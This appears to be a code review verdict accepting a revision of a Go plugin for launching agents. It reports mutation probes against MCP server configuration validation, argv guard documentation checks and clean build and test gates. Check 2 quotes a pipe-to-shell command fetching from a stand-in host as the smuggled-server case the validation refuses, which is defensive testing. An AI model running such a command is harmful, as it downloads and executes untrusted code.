# TASK-260822-3u97y3 — review verdict, revision 2: ACCEPTED

Reviewer of record for rev 1 as well. This is a narrow re-review against the four
checks the rev-2 brief named, not a re-run of the rev-1 review.

## Candidate tree

The working tree was reconstructed into a scratch index (`GIT_INDEX_FILE`, `git add -A`,
`git write-tree`) and hashes to **`7ec0e09152963f037a3bcf2409fa8c826411c58a`** — the
candidate OID exactly. Every observation below was taken at that tree. After the mutation
work the same reconstruction was repeated and returned the same OID, so nothing in this
review leaked into the candidate.

Base: `5653b7d60c050e3d53e21a6d76672a1ffac9fafe`. Rev-1 candidate: `b4f647e`.

## 1. Diff discipline — production untouched. CONFIRMED

`git diff --stat b4f647e 7ec0e09` is six files: three `_test.go`, `LOGBOOK.md`, and two
production files, `internal/argvguard/argvguard.go` (+14/-4) and
`pkg/agentic/systems/claude/goal.go` (+11/-3).

The claim that those two are comment-only was not taken on inspection. Every added and
removed line in both files was filtered mechanically:

```
git diff b4f647e 7ec0e09 -- internal/argvguard/argvguard.go pkg/agentic/systems/claude/goal.go \
  | grep -E '^[+-]' | grep -vE '^(\+\+\+|---)' | grep -vE '^[+-]\s*//'
```

Empty. Zero non-comment changed lines across both files. `goal.go`'s change is source-path
precision (`spawn/claude_goal.go` → `tools/board-cli/internal/spawn/claude_goal.go`);
`argvguard.go`'s is the residual-ownership rewrite reviewed in check 4. No production logic
moved between revisions.

## 2. The three rev-1 probes, as I wrote them — all red against the gates

Each mutant was applied to the production file, the suite run, and the file restored from a
backup taken before the first mutation.

| # | Probe | Mutant applied to production | Result |
|---|---|---|---|
| P1 | empty-`type` smuggled server | delete the `!exists` → `references unknown MCP server` refusal | **RED** — `.../a_server_the_metadata_never_declared` |
| P2 | same-transport duplicate swapping `BearerTokenEnvVar` | delete the `duplicate` → `declares the MCP server %q twice` refusal | **RED** — `.../the_same_server_declared_twice` |
| P3a | capabilities pin, single-field narrowing | `HomeEnvVar: "CLAUDE_CONFIG_DIR"` → `"CLAUDE_HOME"`, `DefaultHome` untouched | **RED** — `TestTheDeclaredCapabilities`, sole failure |
| P3b | capabilities pin, the other field | `DefaultHome: "~/.claude"` → `"~/.config/claude"`, `HomeEnvVar` untouched | **RED** — `TestTheDeclaredCapabilities`, sole failure |

P3a/P3b matter as a pair: each moves exactly one field and each is caught alone, so the pin
covers the field rather than the struct literal. No golden shadows either — moving the home
identity used to survive the whole suite, and now does not.

P1's isolation is real and is the point of the rework: with the refusal deleted, the
undeclared name resolves to the zero `CompositionServer` (`Transport: ""`), the entry's
empty `type` agrees with it, and the stdio branch accepts `curl evil.invalid | sh`. Nothing
downstream can refuse it. The rev-1 shape (`"type":"stdio"`) would have been stopped by the
entry-shape rule first, leaving the unknown-server rule deletable.

## 3. Two sweep pins, chosen by me, re-derived as mutants

I picked one **shadowed refusal that rev 2 claims to have un-shadowed** and one
**sub-condition that rev 1 had no case for at all**, then added two more of my own to widen
the sample beyond the two asked for.

| # | Pin (my choice) | Mutant | Result |
|---|---|---|---|
| S1 | `entry.Type != server.Transport` — the shadowed one | drop that term from the compound `if`, keep strict decoding | **RED** — both `an_entry_typing_itself_against_the_transport_the_metadata_declares` and `the_mirror_of_the_case_above` |
| S2 | `len(entry.Headers) != 0` in the **stdio** branch — no case in rev 1 | drop that term, keep command/url terms | **RED** — `a_stdio_server_carrying_headers`, sole failure |
| S3 | `len(entry.Args) != 0` in the **http** branch — extra sample | drop that term, keep url/command terms | **RED** — `an_http_server_carrying_args`, sole failure |
| S5 | `root.MCPServers == nil` — extra sample, my own pick | drop that term, keep `len(...) != len(servers)` | **RED** — `a_config_argument_whose_document_is_not_an_MCP_config`, sole failure |

Every one is a **narrowing** mutant, not a delete: the enclosing gate survives and only the
named sub-condition is removed. S2, S3 and S5 each fail exactly one case, which is the
evidence that the sub-condition had no other holder before rev 2 added it — a delete-only
mutant would not have distinguished that.

S1 failing two cases is correct rather than sloppy: the case and its mirror are the two
directions of one rule, and each is valid under the *other* side's transport shape, so the
type comparison is the only thing left to refuse either.

The `TrimSpace` pin I suggested at rev 1 was also verified:
`"--model", strings.TrimSpace(req.Model.ID)` → `"--model", req.Model.ID` is **RED** on
`TestTheModelIDIsTrimmedBeforeItReachesArgv`, sole failure. Neither golden carries a padded
id, so nothing else reads that line.

Six mutants sampled from the claimed 21, zero survivors. The sample deliberately spans both
classes the sweep claims (previously-shadowed refusals and never-covered sub-conditions)
plus one I chose without reference to the producer's list.

## 4. Residual ownership — the doc claim was fixed, not duplicated. CONFIRMED

The rev-1 finding was that `argvguard.go` promised "each plugin's guard test demonstrates
them", which would have obliged every future plugin to restate the scanner's three residual
classes. Rev 2 changed the promise instead of satisfying it by copy:

- `internal/argvguard/argvguard.go` now says the three classes belong to **this scanner**,
  are demonstrated **once** by `TestCodexArgvGuardResidualGaps`, and that each plugin
  separately demonstrates the residual its own **signature** leaves — naming claude's as
  `TestTheDeclaredResidualStaysOpen`.
- Both named tests exist and run: `TestCodexArgvGuardResidualGaps`
  (`codex/argvguard_test.go:321`, three subtests, one per class) and
  `TestTheDeclaredResidualStaysOpen` (`claude/argvguard_test.go:345`).
- Claude's file header does **not** re-promise the scanner classes. It states the opposite
  explicitly — the scanner is shared, carries "one declared-open residual list", and what
  stays in the plugin is "the signature literals, the allowlist, and the demonstration that
  both bite on this module's own code".
- Claude's own signature residual (a copy spelling only the unconditional prompt-mode flags,
  which the signature deliberately omits so the guard cannot fire on a future agy/qwen
  plugin) is documented on `claudeArgvSignature` and demonstrated by that test.

So the codex scanner residuals are named once, owned once, and are not silently re-promised
per plugin. A comment and its demonstration point at each other in both directions.

## Gates — all foreground, all on the pristine candidate tree

| Gate | Result |
|---|---|
| `gofmt -l pkg/` | clean (no output) |
| `make vet` | clean |
| `make build` | clean |
| `env -u TASK_BOARD_DIR go test -mod=mod ./... -count=1` | **11/11 ok**, 0 failures |

Packages green: `internal/argvguard`, `internal/gosources`, `internal/ident`,
`internal/launchenv`, `pkg/agentic`, `pkg/agentic/parity`,
`pkg/agentic/systems/claude`, `pkg/agentic/systems/codex`, `pkg/vendorplugin`,
`tools/agents-management/cmd`. Re-run after all mutations were reverted.

## Acceptance criteria

1. **Plans byte-match the claude goldens for both modes** — `pkg/agentic/parity` and the
   claude parity tests green at the candidate tree.
2. **Env contract ported exactly** — `internal/launchenv` and `claude/env_test.go` green;
   unchanged from rev 1, where the prefix and wipe negatives were verified red.
3. **Goal-mode preparation documented out with the source's behaviour referenced** —
   `goal.go`'s "NOT in the plan surface: launch PREPARATION" section, now carrying the
   precise source path. The refusal half that does live in this plan surface is pinned by
   `TestAGoalBoundLaunchWithoutAnAssignmentFileIsRefused` and the empty-predicate test.
4. **Guard sees one binding file** — `pkg/agentic` singlesource guard and scan-scope tests
   green; claude's argv guard fires on its real construction site, does not fire on the
   codex plugin, and catches a second construction site.

## Verdict

**ACCEPTED.** Production untouched between revisions and proven so mechanically. All three
rev-1 findings are closed with probes that are isolated rather than merely present — each
mutant reaches the named rule and nothing earlier refuses it first. The sweep went past what
was asked: it mutated every refusal branch and sub-condition in `composition.go` rather than
pattern-matching the two I named, and found nine unpinned branches where I had found two.
My independent sample of that sweep found no survivors. The argvguard doc defect was fixed
at the contract rather than papered over with a duplicate test.
